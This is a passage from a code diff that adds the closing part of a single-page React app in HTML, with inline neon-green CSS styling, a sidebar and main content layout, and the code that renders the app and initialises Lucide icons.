+            };
+
+            return (
+                <div className="flex min-h-screen bg-gray-900">
+                    <style>{`
+                        /* Neon Glow for general elements */
+                        .shadow-neon-glow {
+                            box-shadow: 0 0 5px rgba(0, 255, 153, 0.5);
+                        }
+                        .hover\\:shadow-neon-glow:hover {
+                            box-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
+                        }
+                        .text-neon-green {
+                            color: var(--neon-green);
+                        }
+                        .border-neon-green {
+                            border-color: var(--neon-green);
+                        }
+                        .bg-neon-green\\/20 {
+                            background-color: rgba(0, 255, 153, 0.2);
+                        }
+                        .content-area {
+                            margin-left: 0;
+                            flex: 1;
+                        }
+                        @media (min-width: 768px) {
+                            .content-area {
+                                margin-left: 14rem;
+                            }
+                        }
+                        /* Custom focus rings and aggressive terminal aesthetic for inputs */
+                        input:focus, select:focus, textarea:focus {
+                            outline: none !important;
+                            border-color: var(--neon-green) !important;
+                            box-shadow: 0 0 5px rgba(0, 255, 153, 0.5) !important;
+                        }
+
+                        /* Custom confirmation/alert box and full-height scroll fix */
+                        .fixed {
+                            top: 0;
+                            left: 0;
+                            right: 0;
+                            bottom: 0;
+                            position: fixed;
+                        }
+                        /* Custom height utility to ensure the editor/list split works well */
+                        .h-\\[calc\\(100vh-100px\\)\\] {
+                            height: calc(100vh - 100px); /* Header height + some margin */
+                        }
+                    `}</style>
+                    
+                    {/* Sidebar (Fixed width) */}
+                    <Sidebar currentView={currentView} setView={setCurrentView} />
+
+                    {/* Main Content Area (Responsive margin) */}
+                    <main className="flex-1 p-0 content-area pb-10">
+                        {renderView()}
+                    </main>
+                </div>
+            );
+        };
+
+        // Render the App component
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+        
+        // Final call to ensure initial static icons (like in Sidebar) are rendered
+        document.addEventListener('DOMContentLoaded', () => {
+            if (typeof lucide !== 'undefined' && lucide.createIcons) {
+                lucide.createIcons();
+            }
+        });
+    </script>
+</body>
+</html>
